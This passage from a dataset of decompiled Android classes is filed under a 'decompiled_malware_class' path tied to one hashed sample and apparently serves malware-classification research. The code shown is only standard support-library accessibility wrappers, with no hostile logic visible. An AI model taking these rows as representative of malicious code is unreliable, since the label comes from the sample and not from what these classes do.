IMPL.isAccessibilityFocused(this.mInfo);   }   public void setAccessibilityFocused(  boolean focused){     IMPL.setAccessibilityFocused(this.mInfo,focused);   }   public boolean isSelected(){     return IMPL.isSelected(this.mInfo);   }   public void setSelected(  boolean selected){     IMPL.setSelected(this.mInfo,selected);   }   public boolean isClickable(){     return IMPL.isClickable(this.mInfo);   }   public void setClickable(  boolean clickable){     IMPL.setClickable(this.mInfo,clickable);   }   public boolean isLongClickable(){     return IMPL.isLongClickable(this.mInfo);   }   public void setLongClickable(  boolean longClickable){     IMPL.setLongClickable(this.mInfo,longClickable);   }   public boolean isEnabled(){     return IMPL.isEnabled(this.mInfo);   }   public void setEnabled(  boolean enabled){     IMPL.setEnabled(this.mInfo,enabled);   }   public boolean isPassword(){     return IMPL.isPassword(this.mInfo);   }   public void setPassword(  boolean password){     IMPL.setPassword(this.mInfo,password);   }   public boolean isScrollable(){     return IMPL.isScrollable(this.mInfo);   }   public void setScrollable(  boolean scrollable){     IMPL.setScrollable(this.mInfo,scrollable);   }   public CharSequence getPackageName(){     return IMPL.getPackageName(this.mInfo);   }   public void setPackageName(  CharSequence packageName){     IMPL.setPackageName(this.mInfo,packageName);   }   public CharSequence getClassName(){     return IMPL.getClassName(this.mInfo);   }   public void setClassName(  CharSequence className){     IMPL.setClassName(this.mInfo,className);   }   public CharSequence getText(){     return IMPL.getText(this.mInfo);   }   public void setText(  CharSequence text){     IMPL.setText(this.mInfo,text);   }   public CharSequence getContentDescription(){     return IMPL.getContentDescription(this.mInfo);   }   public void setContentDescription(  CharSequence contentDescription){     IMPL.setContentDescription(this.mInfo,contentDescription);   }   public void recycle(){     IMPL.recycle(this.mInfo);   }   public int hashCode(){     if (this.mInfo == null) {       return 0;     }     return this.mInfo.hashCode();   }   public boolean equals(  Object obj){     if (this == obj) {       return true;     }     if (obj != null && getClass() == obj.getClass()) {       AccessibilityNodeInfoCompat other=(AccessibilityNodeInfoCompat)obj;       return this.mInfo == null ? other.mInfo == null : this.mInfo.equals(other.mInfo);     }     return false;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view.accessibility\AccessibilityNodeInfoCompatIcs.code","class AccessibilityNodeInfoCompatIcs {   AccessibilityNodeInfoCompatIcs(){   }   public static Object obtain(){     return AccessibilityNodeInfo.obtain();   }   public static Object obtain(  View source){     return AccessibilityNodeInfo.obtain(source);   }   public static Object obtain(  Object info){     return AccessibilityNodeInfo.obtain((AccessibilityNodeInfo)info);   }   public static void addAction(  Object info,  int action){     ((AccessibilityNodeInfo)info).addAction(action);   }   public static void addChild(  Object info,  View child){     ((AccessibilityNodeInfo)info).addChild(child);   }   public static List<Object> findAccessibilityNodeInfosByText(  Object info,  String text){     List result=((AccessibilityNodeInfo)info).findAccessibilityNodeInfosByText(text);     return result;   }   public static int getActions(  Object info){     return ((AccessibilityNodeInfo)info).getActions();   }   public static void getBoundsInParent(  Object info,  Rect outBounds){     ((AccessibilityNodeInfo)info).getBoundsInParent(outBounds);   }   public static void getBoundsInScreen(  Object info,  Rect outBounds){     ((AccessibilityNodeInfo)info).getBoundsInScreen(outBounds);   }   public static Object getChild(  Object info,  int index){     return ((AccessibilityNodeInfo)info).getChild(index);   }   public static int getChildCount(  Object info){     return ((AccessibilityNodeInfo)info).getChildCount();   }   public static CharSequence getClassName(  Object info){     return ((AccessibilityNodeInfo)info).getClassName();   }   public static CharSequence getContentDescription(  Object info){     return ((AccessibilityNodeInfo)info).getContentDescription();   }   public static CharSequence getPackageName(  Object info){     return ((AccessibilityNodeInfo)info).getPackageName();   }   public static Object getParent(  Object info){     return ((AccessibilityNodeInfo)info).getParent();   }   public static CharSequence getText(  Object info){     return ((AccessibilityNodeInfo)info).getText();   }   public static int getWindowId(  Object info){     return ((AccessibilityNodeInfo)info).getWindowId();   }   public static boolean isCheckable(  Object info){     return ((AccessibilityNodeInfo)info).isCheckable();   }   public static boolean isChecked(  Object info){     return ((AccessibilityNodeInfo)info).isChecked();   }   public static boolean isClickable(  Object info){     return ((AccessibilityNodeInfo)info).isClickable();   }   public static boolean isEnabled(  Object info){     return ((AccessibilityNodeInfo)info).isEnabled();   }   public static boolean isFocusable(  Object info){     return ((AccessibilityNodeInfo)info).isFocusable();   }   public static boolean isFocused(  Object info){     return ((AccessibilityNodeInfo)info).isFocused();   }   public static boolean isLongClickable(  Object info){     return ((AccessibilityNodeInfo)info).isLongClickable();   }   public static boolean isPassword(  Object info){     return ((AccessibilityNodeInfo)info).isPassword();   }   public static boolean isScrollable(  Object info){     return ((AccessibilityNodeInfo)info).isScrollable();   }   public static boolean isSelected(  Object info){     return ((AccessibilityNodeInfo)info).isSelected();   }   public static boolean performAction(  Object info,  int action){     return ((AccessibilityNodeInfo)info).performAction(action);   }   public static void setBoundsInParent(  Object info,  Rect bounds){     ((AccessibilityNodeInfo)info).setBoundsInParent(bounds);   }   public static void setBoundsInScreen(  Object info,  Rect bounds){     ((AccessibilityNodeInfo)info).setBoundsInScreen(bounds);   }   public static void setCheckable(  Object info,  boolean checkable){     ((AccessibilityNodeInfo)info).setCheckable(checkable);   }   public static void setChecked(  Object info,  boolean checked){     ((AccessibilityNodeInfo)info).setChecked(checked);   }   public static void setClassName(  Object info,  CharSequence className){     ((AccessibilityNodeInfo)info).setClassName(className);   }   public static void setClickable(  Object info,  boolean clickable){     ((AccessibilityNodeInfo)info).setClickable(clickable);   }   public static void setContentDescription(  Object info,  CharSequence contentDescription){     ((AccessibilityNodeInfo)info).setContentDescription(contentDescription);   }   public static void setEnabled(  Object info,  boolean enabled){     ((AccessibilityNodeInfo)info).setEnabled(enabled);   }   public static void setFocusable(  Object info,  boolean focusable){     ((AccessibilityNodeInfo)info).setFocusable(focusable);   }   public static void setFocused(  Object info,  boolean focused){     ((AccessibilityNodeInfo)info).setFocused(focused);   }   public static void setLongClickable(  Object info,  boolean longClickable){     ((AccessibilityNodeInfo)info).setLongClickable(longClickable);   }   public static void setPackageName(  Object info,  CharSequence packageName){     ((AccessibilityNodeInfo)info).setPackageName(packageName);   }   public static void setParent(  Object info,  View parent){     ((AccessibilityNodeInfo)info).setParent(parent);   }   public static void setPassword(  Object info,  boolean password){     ((AccessibilityNodeInfo)info).setPassword(password);   }   public static void setScrollable(  Object info,  boolean scrollable){     ((AccessibilityNodeInfo)info).setScrollable(scrollable);   }   public static void setSelected(  Object info,  boolean selected){     ((AccessibilityNodeInfo)info).setSelected(selected);   }   public static void setSource(  Object info,  View source){     ((AccessibilityNodeInfo)info).setSource(source);   }   public static void setText(  Object info,  CharSequence text){     ((AccessibilityNodeInfo)info).setText(text);   }   public static void recycle(  Object info){     ((AccessibilityNodeInfo)info).recycle();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view.accessibility\AccessibilityNodeInfoCompatJellyBean.code","class AccessibilityNodeInfoCompatJellyBean {   AccessibilityNodeInfoCompatJellyBean(){   }   public static void addChild(  Object info,  View child,  int virtualDescendantId){     ((AccessibilityNodeInfo)info).addChild(child,virtualDescendantId);   }   public static void setSource(  Object info,  View root,  int virtualDescendantId){     ((AccessibilityNodeInfo)info).setSource(root,virtualDescendantId);   }   public static boolean isVisibleToUser(  Object info){     return ((AccessibilityNodeInfo)info).isVisibleToUser();   }   public static void setVisibleToUser(  Object info,  boolean visibleToUser){     ((AccessibilityNodeInfo)info).setVisibleToUser(visibleToUser);   }   public static boolean performAction(  Object info,  int action,  Bundle arguments){     return ((AccessibilityNodeInfo)info).performAction(action,arguments);   }   public static void setMovementGranularities(  Object info,  int granularities){     ((AccessibilityNodeInfo)info).setMovementGranularities(granularities);   }   public static int getMovementGranularities(  Object info){     return ((AccessibilityNodeInfo)info).getMovementGranularities();   }   public static Object obtain(  View root,  int virtualDescendantId){     return AccessibilityNodeInfo.obtain(root,virtualDescendantId);   }   public static Object findFocus(  Object info,  int focus){     return ((AccessibilityNodeInfo)info).findFocus(focus);   }   public static Object focusSearch(  Object info,  int direction){     return ((AccessibilityNodeInfo)info).focusSearch(direction);   }   public static void setParent(  Object info,  View root,  int virtualDescendantId){     ((AccessibilityNodeInfo)info).setParent(root,virtualDescendantId);   }   public static boolean isAccessibilityFocused(  Object info){     return ((AccessibilityNodeInfo)info).isAccessibilityFocused();   }   public static void setAccesibilityFocused(  Object info,  boolean focused){     ((AccessibilityNodeInfo)info).setAccessibilityFocused(focused);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view.accessibility\AccessibilityNodeInfoIcsImpl.code","static class AccessibilityNodeInfoIcsImpl extends AccessibilityNodeInfoStubImpl {   AccessibilityNodeInfoIcsImpl(){   }   @Override public Object obtain(){     return AccessibilityNodeInfoCompatIcs.obtain();   }   @Override public Object obtain(  View source){     return AccessibilityNodeInfoCompatIcs.obtain(source);   }   @Override public Object obtain(  Object info){     return AccessibilityNodeInfoCompatIcs.obtain(info);   }   @Override public void addAction(  Object info,  int action){     AccessibilityNodeInfoCompatIcs.addAction(info,action);   }   @Override public void addChild(  Object info,  View child){     AccessibilityNodeInfoCompatIcs.addChild(info,child);   }   @Override public List<Object> findAccessibilityNodeInfosByText(  Object info,  String text){     return AccessibilityNodeInfoCompatIcs.findAccessibilityNodeInfosByText(info,text);   }   @Override public int getActions(  Object info){     return AccessibilityNodeInfoCompatIcs.getActions(info);   }   @Override public void getBoundsInParent(  Object info,  Rect outBounds){     AccessibilityNodeInfoCompatIcs.getBoundsInParent(info,outBounds);   }   @Override public void getBoundsInScreen(  Object info,  Rect outBounds){     AccessibilityNodeInfoCompatIcs.getBoundsInScreen(info,outBounds);   }   @Override public Object getChild(  Object info,  int index){     return AccessibilityNodeInfoCompatIcs.getChild(info,index);   }   @Override public int getChildCount(  Object info){     return AccessibilityNodeInfoCompatIcs.getChildCount(info);   }   @Override public CharSequence getClassName(  Object info){     return AccessibilityNodeInfoCompatIcs.getClassName(info);   }   @Override public CharSequence getContentDescription(  Object info){     return AccessibilityNodeInfoCompatIcs.getContentDescription(info);   }   @Override public CharSequence getPackageName(  Object info){     return AccessibilityNodeInfoCompatIcs.getPackageName(info);   }   @Override public Object getParent(  Object info){     return AccessibilityNodeInfoCompatIcs.getParent(info);   }   @Override public CharSequence getText(  Object info){     return AccessibilityNodeInfoCompatIcs.getText(info);   }   @Override public int getWindowId(  Object info){     return AccessibilityNodeInfoCompatIcs.getWindowId(info);   }   @Override public boolean isCheckable(  Object info){     return AccessibilityNodeInfoCompatIcs.isCheckable(info);   }   @Override public boolean isChecked(  Object info){     return AccessibilityNodeInfoCompatIcs.isChecked(info);   }   @Override public boolean isClickable(  Object info){     return AccessibilityNodeInfoCompatIcs.isClickable(info);   }   @Override public boolean isEnabled(  Object info){     return AccessibilityNodeInfoCompatIcs.isEnabled(info);   }   @Override public boolean isFocusable(  Object info){     return AccessibilityNodeInfoCompatIcs.isFocusable(info);   }   @Override public boolean isFocused(  Object info){     return AccessibilityNodeInfoCompatIcs.isFocused(info);   }   @Override public boolean isLongClickable(  Object info){     return AccessibilityNodeInfoCompatIcs.isLongClickable(info);   }   @Override public boolean isPassword(  Object info){     return AccessibilityNodeInfoCompatIcs.isPassword(info);   }   @Override public boolean isScrollable(  Object info){     return AccessibilityNodeInfoCompatIcs.isScrollable(info);   }   @Override public boolean isSelected(  Object info){     return AccessibilityNodeInfoCompatIcs.isSelected(info);   }   @Override public boolean performAction(  Object info,  int action){     return AccessibilityNodeInfoCompatIcs.performAction(info,action);   }   @Override public void setBoundsInParent(  Object info,  Rect bounds){     AccessibilityNodeInfoCompatIcs.setBoundsInParent(info,bounds);   }   @Override public void setBoundsInScreen(  Object info,  Rect bounds){     AccessibilityNodeInfoCompatIcs.setBoundsInScreen(info,bounds);   }   @Override public void setCheckable(  Object info,  boolean checkable){     AccessibilityNodeInfoCompatIcs.setCheckable(info,checkable);   }   @Override public void setChecked(  Object info,  boolean checked){     AccessibilityNodeInfoCompatIcs.setChecked(info,checked);   }   @Override public void setClassName(  Object info,  CharSequence className){     AccessibilityNodeInfoCompatIcs.setClassName(info,className);   }   @Override public void setClickable(  Object info,  boolean clickable){     AccessibilityNodeInfoCompatIcs.setClickable(info,clickable);   }   @Override public void setContentDescription(  Object info,  CharSequence contentDescription){     AccessibilityNodeInfoCompatIcs.setContentDescription(info,contentDescription);   }   @Override public void setEnabled(  Object info,  boolean enabled){     AccessibilityNodeInfoCompatIcs.setEnabled(info,enabled);   }   @Override public void setFocusable(  Object info,  boolean focusable){     AccessibilityNodeInfoCompatIcs.setFocusable(info,focusable);   }   @Override public void setFocused(  Object info,  boolean focused){     AccessibilityNodeInfoCompatIcs.setFocused(info,focused);   }   @Override public void setLongClickable(  Object info,  boolean longClickable){     AccessibilityNodeInfoCompatIcs.setLongClickable(info,longClickable);   }   @Override public void setPackageName(  Object info,  CharSequence packageName){     AccessibilityNodeInfoCompatIcs.setPackageName(info,packageName);   }   @Override public void setParent(  Object info,  View parent){     AccessibilityNodeInfoCompatIcs.setParent(info,parent);   }   @Override public void setPassword(  Object info,  boolean password){     AccessibilityNodeInfoCompatIcs.setPassword(info,password);   }   @Override public void setScrollable(  Object info,  boolean scrollable){     AccessibilityNodeInfoCompatIcs.setScrollable(info,scrollable);   }   @Override public void setSelected(  Object info,  boolean selected){     AccessibilityNodeInfoCompatIcs.setSelected(info,selected);   }   @Override public void setSource(  Object info,  View source){     AccessibilityNodeInfoCompatIcs.setSource(info,source);   }   @Override public void setText(  Object info,  CharSequence text){     AccessibilityNodeInfoCompatIcs.setText(info,text);   }   @Override public void recycle(  Object info){     AccessibilityNodeInfoCompatIcs.recycle(info);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view.accessibility\AccessibilityNodeInfoImpl.code","interface AccessibilityNodeInfoImpl {   void addAction(  Object obj,  int i);   void addChild(  Object obj,  View view);   void addChild(  Object obj,  View view,  int i);   List<Object> findAccessibilityNodeInfosByText(  Object obj,  String str);   Object findFocus(  Object obj,  int i);   Object focusSearch(  Object obj,  int i);   int getActions(  Object obj);   void getBoundsInParent(  Object obj,  Rect rect);   void getBoundsInScreen(  Object obj,  Rect rect);   Object getChild(  Object obj,  int i);   int getChildCount(  Object obj);   CharSequence getClassName(  Object obj);   CharSequence getContentDescription(  Object obj);   int getMovementGranularities(  Object obj);   CharSequence getPackageName(  Object obj);   Object getParent(  Object obj);   CharSequence getText(  Object obj);   int getWindowId(  Object obj);   boolean isAccessibilityFocused(  Object obj);   boolean isCheckable(  Object obj);   boolean isChecked(  Object obj);   boolean isClickable(  Object obj);   boolean isEnabled(  Object obj);   boolean isFocusable(  Object obj);   boolean isFocused(  Object obj);   boolean isLongClickable(  Object obj);   boolean isPassword(  Object obj);   boolean isScrollable(  Object obj);   boolean isSelected(  Object obj);   boolean isVisibleToUser(  Object obj);   Object obtain();   Object obtain(  View view);   Object obtain(  View view,  int i);   Object obtain(  Object obj);   boolean performAction(  Object obj,  int i);   boolean performAction(  Object obj,  int i,  Bundle bundle);   void recycle(  Object obj);   void setAccessibilityFocused(  Object obj,  boolean z);   void setBoundsInParent(  Object obj,  Rect rect);   void setBoundsInScreen(  Object obj,  Rect rect);   void setCheckable(  Object obj,  boolean z);   void setChecked(  Object obj,  boolean z);   void setClassName(  Object obj,  CharSequence charSequence);   void setClickable(  Object obj,  boolean z);   void setContentDescription(  Object obj,  CharSequence charSequence);   void setEnabled(  Object obj,  boolean z);   void setFocusable(  Object obj,  boolean z);   void setFocused(  Object obj,  boolean z);   void setLongClickable(  Object obj,  boolean z);   void setMovementGranularities(  Object obj,  int i);   void setPackageName(  Object obj,  CharSequence charSequence);   void setParent(  Object obj,  View view);   void setParent(  Object obj,  View view,  int i);   void setPassword(  Object obj,  boolean z);   void setScrollable(  Object obj,  boolean z);   void setSelected(  Object obj,  boolean z);   void setSource(  Object obj,  View view);   void setSource(  Object obj,  View view,  int i);   void setText(  Object obj,  CharSequence charSequence);   void setVisibleToUser(  Object obj,  boolean z); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view.accessibility\AccessibilityNodeInfoJellybeanImpl.code","static class AccessibilityNodeInfoJellybeanImpl extends AccessibilityNodeInfoIcsImpl {   AccessibilityNodeInfoJellybeanImpl(){   }   @Override public Object obtain(  View root,  int virtualDescendantId){     return AccessibilityNodeInfoCompatJellyBean.obtain(root,virtualDescendantId);   }   @Override public Object findFocus(  Object info,  int focus){     return AccessibilityNodeInfoCompatJellyBean.findFocus(info,focus);   }   @Override public Object focusSearch(  Object info,  int direction){     return AccessibilityNodeInfoCompatJellyBean.focusSearch(info,direction);   }   @Override public void addChild(  Object info,  View child,  int virtualDescendantId){     AccessibilityNodeInfoCompatJellyBean.addChild(info,child,virtualDescendantId);   }   @Override public void setSource(  Object info,  View root,  int virtualDescendantId){     AccessibilityNodeInfoCompatJellyBean.setSource(info,root,virtualDescendantId);   }   @Override public boolean isVisibleToUser(  Object info){     return AccessibilityNodeInfoCompatJellyBean.isVisibleToUser(info);   }   @Override public void setVisibleToUser(  Object info,  boolean visibleToUser){     AccessibilityNodeInfoCompatJellyBean.setVisibleToUser(info,visibleToUser);   }   @Override public boolean isAccessibilityFocused(  Object info){     return AccessibilityNodeInfoCompatJellyBean.isAccessibilityFocused(info);   }   @Override public void setAccessibilityFocused(  Object info,  boolean focused){     AccessibilityNodeInfoCompatJellyBean.setAccesibilityFocused(info,focused);   }   @Override public boolean performAction(  Object info,  int action,  Bundle arguments){     return AccessibilityNodeInfoCompatJellyBean.performAction(info,action,arguments);   }   @Override public void setMovementGranularities(  Object info,  int granularities){     AccessibilityNodeInfoCompatJellyBean.setMovementGranularities(info,granularities);   }   @Override public int getMovementGranularities(  Object info){     return AccessibilityNodeInfoCompatJellyBean.getMovementGranularities(info);   }   @Override public void setParent(  Object info,  View root,  int virtualDescendantId){     AccessibilityNodeInfoCompatJellyBean.setParent(info,root,virtualDescendantId);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view.accessibility\AccessibilityNodeInfoStubImpl.code","static class AccessibilityNodeInfoStubImpl implements AccessibilityNodeInfoImpl {   AccessibilityNodeInfoStubImpl(){   }   @Override public Object obtain(){     return null;   }   @Override public Object obtain(  View source){     return null;   }   @Override public Object obtain(  View root,  int virtualDescendantId){     return null;   }   @Override public Object obtain(  Object info){     return null;   }   @Override public void addAction(  Object info,  int action){   }   @Override public void addChild(  Object info,  View child){   }   @Override public void addChild(  Object info,  View child,  int virtualDescendantId){   }   @Override public List<Object> findAccessibilityNodeInfosByText(  Object info,  String text){     return Collections.emptyList();   }   @Override public int getActions(  Object info){     return 0;   }   @Override public void getBoundsInParent(  Object info,  Rect outBounds){   }   @Override public void getBoundsInScreen(  Object info,  Rect outBounds){   }   @Override public Object getChild(  Object info,  int index){     return null;   }   @Override public int getChildCount(  Object info){     return 0;   }   @Override public CharSequence getClassName(  Object info){     return null;   }   @Override public CharSequence getContentDescription(  Object info){     return null;   }   @Override public CharSequence getPackageName(  Object info){     return null;   }   @Override public Object getParent(  Object info){     return null;   }   @Override public CharSequence getText(  Object info){     return null;   }   @Override public int getWindowId(  Object info){     return 0;   }   @Override public boolean isCheckable(  Object info){     return false;   }   @Override public boolean isChecked(  Object info){     return false;   }   @Override public boolean isClickable(  Object info){     return false;   }   @Override public boolean isEnabled(  Object info){     return false;   }   @Override public boolean isFocusable(  Object info){     return false;   }   @Override public boolean isFocused(  Object info){     return false;   }   @Override public boolean isVisibleToUser(  Object info){     return false;   }   @Override public boolean isAccessibilityFocused(  Object info){     return false;   }   @Override public boolean isLongClickable(  Object info){     return false;   }   @Override public boolean isPassword(  Object info){     return false;   }   @Override public boolean isScrollable(  Object info){     return false;   }   @Override public boolean isSelected(  Object info){     return false;   }   @Override public boolean performAction(  Object info,  int action){     return false;   }   @Override public boolean performAction(  Object info,  int action,  Bundle arguments){     return false;   }   @Override public void setMovementGranularities(  Object info,  int granularities){   }   @Override public int getMovementGranularities(  Object info){     return 0;   }   @Override public void setBoundsInParent(  Object info,  Rect bounds){   }   @Override public void setBoundsInScreen(  Object info,  Rect bounds){   }   @Override public void setCheckable(  Object info,  boolean checkable){   }   @Override public void setChecked(  Object info,  boolean checked){   }   @Override public void setClassName(  Object info,  CharSequence className){   }   @Override public void setClickable(  Object info,  boolean clickable){   }   @Override public void setContentDescription(  Object info,  CharSequence contentDescription){   }   @Override public void setEnabled(  Object info,  boolean enabled){   }   @Override public void setFocusable(  Object info,  boolean focusable){   }   @Override public void setFocused(  Object info,  boolean focused){   }   @Override public void setVisibleToUser(  Object info,  boolean visibleToUser){   }   @Override public void setAccessibilityFocused(  Object info,  boolean focused){   }   @Override public void setLongClickable(  Object info,  boolean longClickable){   }   @Override public void setPackageName(  Object info,  CharSequence packageName){   }   @Override public void setParent(  Object info,  View parent){   }   @Override public void setPassword(  Object info,  boolean password){   }   @Override public void setScrollable(  Object info,  boolean scrollable){   }   @Override public void setSelected(  Object info,  boolean selected){   }   @Override public void setSource(  Object info,  View source){   }   @Override public void setSource(  Object info,  View root,  int virtualDescendantId){   }   @Override public Object findFocus(  Object info,  int focus){     return null;   }   @Override public Object focusSearch(  Object info,  int direction){     return null;   }   @Override public void setText(  Object info,  CharSequence text){   }   @Override public void recycle(  Object info){   }   @Override public void setParent(  Object info,  View root,  int virtualDescendantId){   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view.accessibility\AccessibilityNodeProviderCompat.code","public class AccessibilityNodeProviderCompat {   private static final AccessibilityNodeProviderImpl IMPL;   private final Object mProvider; interface AccessibilityNodeProviderImpl {     Object newAccessibilityNodeProviderBridge(    AccessibilityNodeProviderCompat accessibilityNodeProviderCompat);   } static class AccessibilityNodeProviderStubImpl implements AccessibilityNodeProviderImpl {     AccessibilityNodeProviderStubImpl(){     }     @Override public Object newAccessibilityNodeProviderBridge(    AccessibilityNodeProviderCompat compat){       return null;     }   } static class AccessibilityNodeProviderJellyBeanImpl extends AccessibilityNodeProviderStubImpl {     AccessibilityNodeProviderJellyBeanImpl(){     }     @Override public Object newAccessibilityNodeProviderBridge(    final AccessibilityNodeProviderCompat compat){       return AccessibilityNodeProviderCompatJellyBean.newAccessibilityNodeProviderBridge(new AccessibilityNodeProviderCompatJellyBean.AccessibilityNodeInfoBridge(){         @Override public boolean performAction(        int virtualViewId,        int action,        Bundle arguments){           return compat.performAction(virtualViewId,action,arguments);         }         @Override public List<Object> findAccessibilityNodeInfosByText(        String text,        int virtualViewId){           List<AccessibilityNodeInfoCompat> compatInfos=compat.findAccessibilityNodeInfosByText(text,virtualViewId);           List<Object> infos=new ArrayList<>();           int infoCount=compatInfos.size();           for (int i=0; i < infoCount; i++) {             AccessibilityNodeInfoCompat infoCompat=compatInfos.get(i);             infos.add(infoCompat.getInfo());           }           return infos;         }         @Override public Object createAccessibilityNodeInfo(        int virtualViewId){           AccessibilityNodeInfoCompat compatInfo=compat.createAccessibilityNodeInfo(virtualViewId);           if (compatInfo == null) {             return null;           }           return compatInfo.getInfo();         }       } );     }   } static {     if (Build.VERSION.SDK_INT >= 16) {       IMPL=new AccessibilityNodeProviderJellyBeanImpl();     }  else {       IMPL=new AccessibilityNodeProviderStubImpl();     }   }   public AccessibilityNodeProviderCompat(){     this.mProvider=IMPL.newAccessibilityNodeProviderBridge(this);   }   public AccessibilityNodeProviderCompat(  Object provider){     this.mProvider=provider;   }   public Object getProvider(){     return this.mProvider;   }   public AccessibilityNodeInfoCompat createAccessibilityNodeInfo(  int virtualViewId){     return null;   }   public boolean performAction(  int virtualViewId,  int action,  Bundle arguments){     return false;   }   public List<AccessibilityNodeInfoCompat> findAccessibilityNodeInfosByText(  String text,  int virtualViewId){     return null;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view.accessibility\AccessibilityNodeProviderCompatJellyBean.code","class AccessibilityNodeProviderCompatJellyBean { interface AccessibilityNodeInfoBridge {     Object createAccessibilityNodeInfo(    int i);     List<Object> findAccessibilityNodeInfosByText(    String str,    int i);     boolean performAction(    int i,    int i2,    Bundle bundle);   }   AccessibilityNodeProviderCompatJellyBean(){   }   public static Object newAccessibilityNodeProviderBridge(  final AccessibilityNodeInfoBridge bridge){     return new AccessibilityNodeProvider(){       @Override public AccessibilityNodeInfo createAccessibilityNodeInfo(      int virtualViewId){         return (AccessibilityNodeInfo)AccessibilityNodeInfoBridge.this.createAccessibilityNodeInfo(virtualViewId);       }       @Override public List<AccessibilityNodeInfo> findAccessibilityNodeInfosByText(      String text,      int virtualViewId){         return AccessibilityNodeInfoBridge.this.findAccessibilityNodeInfosByText(text,virtualViewId);       }       @Override public boolean performAction(      int virtualViewId,      int action,      Bundle arguments){         return AccessibilityNodeInfoBridge.this.performAction(virtualViewId,action,arguments);       }     } ;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view.accessibility\AccessibilityNodeProviderImpl.code","interface AccessibilityNodeProviderImpl {   Object newAccessibilityNodeProviderBridge(  AccessibilityNodeProviderCompat accessibilityNodeProviderCompat); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view.accessibility\AccessibilityNodeProviderJellyBeanImpl.code","static class AccessibilityNodeProviderJellyBeanImpl extends AccessibilityNodeProviderStubImpl {   AccessibilityNodeProviderJellyBeanImpl(){   }   @Override public Object newAccessibilityNodeProviderBridge(  final AccessibilityNodeProviderCompat compat){     return AccessibilityNodeProviderCompatJellyBean.newAccessibilityNodeProviderBridge(new AccessibilityNodeProviderCompatJellyBean.AccessibilityNodeInfoBridge(){       @Override public boolean performAction(      int virtualViewId,      int action,      Bundle arguments){         return compat.performAction(virtualViewId,action,arguments);       }       @Override public List<Object> findAccessibilityNodeInfosByText(      String text,      int virtualViewId){         List<AccessibilityNodeInfoCompat> compatInfos=compat.findAccessibilityNodeInfosByText(text,virtualViewId);         List<Object> infos=new ArrayList<>();         int infoCount=compatInfos.size();         for (int i=0; i < infoCount; i++) {           AccessibilityNodeInfoCompat infoCompat=compatInfos.get(i);           infos.add(infoCompat.getInfo());         }         return infos;       }       @Override public Object createAccessibilityNodeInfo(      int virtualViewId){         AccessibilityNodeInfoCompat compatInfo=compat.createAccessibilityNodeInfo(virtualViewId);         if (compatInfo == null) {           return null;         }         return compatInfo.getInfo();       }     } );   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view.accessibility\AccessibilityNodeProviderStubImpl.code","static class AccessibilityNodeProviderStubImpl implements AccessibilityNodeProviderImpl {   AccessibilityNodeProviderStubImpl(){   }   @Override public Object newAccessibilityNodeProviderBridge(  AccessibilityNodeProviderCompat compat){     return null;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view.accessibility\AccessibilityRecordCompat.code","public class AccessibilityRecordCompat {   private static final AccessibilityRecordImpl IMPL;   private final Object mRecord; interface AccessibilityRecordImpl {     int getAddedCount(    Object obj);     CharSequence getBeforeText(    Object obj);     CharSequence getClassName(    Object obj);     CharSequence getContentDescription(    Object obj);     int getCurrentItemIndex(    Object obj);     int getFromIndex(    Object obj);     int getItemCount(    Object obj);     int getMaxScrollX(    Object obj);     int getMaxScrollY(    Object obj);     Parcelable getParcelableData(    Object obj);     int getRemovedCount(    Object obj);     int getScrollX(    Object obj);     int getScrollY(    Object obj);     AccessibilityNodeInfoCompat getSource(    Object obj);     List<CharSequence> getText(    Object obj);     int getToIndex(    Object obj);     int getWindowId(    Object obj);     boolean isChecked(    Object obj);     boolean isEnabled(    Object obj);     boolean isFullScreen(    Object obj);     boolean isPassword(    Object obj);     boolean isScrollable(    Object obj);     Object obtain();     Object obtain(    Object obj);     void recycle(    Object obj);     void setAddedCount(    Object obj,    int i);     void setBeforeText(    Object obj,    CharSequence charSequence);     void setChecked(    Object obj,    boolean z);     void setClassName(    Object obj,    CharSequence charSequence);     void setContentDescription(    Object obj,    CharSequence charSequence);     void setCurrentItemIndex(    Object obj,    int i);     void setEnabled(    Object obj,    boolean z);     void setFromIndex(    Object obj,    int i);     void setFullScreen(    Object obj,    boolean z);     void setItemCount(    Object obj,    int i);     void setMaxScrollX(    Object obj,    int i);     void setMaxScrollY(    Object obj,    int i);     void setParcelableData(    Object obj,    Parcelable parcelable);     void setPassword(    Object obj,    boolean z);     void setRemovedCount(    Object obj,    int i);     void setScrollX(    Object obj,    int i);     void setScrollY(    Object obj,    int i);     void setScrollable(    Object obj,    boolean z);     void setSource(    Object obj,    View view);     void setSource(    Object obj,    View view,    int i);     void setToIndex(    Object obj,    int i);   } static class AccessibilityRecordStubImpl implements AccessibilityRecordImpl {     AccessibilityRecordStubImpl(){     }     @Override public Object obtain(){       return null;     }     @Override public Object obtain(    Object record){       return null;     }     @Override public int getAddedCount(    Object record){       return 0;     }     @Override public CharSequence getBeforeText(    Object record){       return null;     }     @Override public CharSequence getClassName(    Object record){       return null;     }     @Override public CharSequence getContentDescription(    Object record){       return null;     }     